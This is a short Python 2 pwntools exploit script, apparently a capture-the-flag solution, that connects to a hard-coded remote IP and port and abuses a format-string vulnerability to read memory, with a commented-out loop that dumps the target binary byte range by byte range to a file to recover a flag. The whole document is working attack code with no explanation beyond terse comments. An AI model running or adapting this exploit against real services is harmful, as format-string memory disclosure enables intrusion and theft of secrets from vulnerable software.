#!/usr/bin/env python2

from pwn import *

p = remote('206.81.24.129', 1337)

p.sendlineafter(':', '%6$s')
p.sendlineafter(':', 'AA' + p32(0x08048000))

print p.recvline()

'''
#!/usr/bin/env python2

from pwn import *

HOST, PORT = '206.81.24.129', 1337
context.log_level = 'critical'

base = 0x08048000 # base addr of 32 bit binaries without PIE

while True:
    leak = ""
    with open("output.raw", "a") as f:
        p = remote(HOST, PORT)
        p.sendlineafter(':', '%6$s') # (base + len(leak)) is at %6$x, so we dereference that addr with %6$s to leak the binary
        p.sendlineafter(':', 'AA' + p32(base + len(leak)) + 'BB')
        leak = p.recvuntil('does')[:-5] + '\x00' # Must add NULL byte otherwise it hangs
        p.close()

        # Must also replace newlines with \x00, it will cause the binary to be slightly corrupted but it doesn't matter in this
        # case because the flag is in the .bss segment
        if '\n' in leak:
            leak = "\x00"

        # Sit back and relax
        f.write(leak)
        print leak.encode('hex') + " @ " + hex(base)
        base += len(leak)
'''
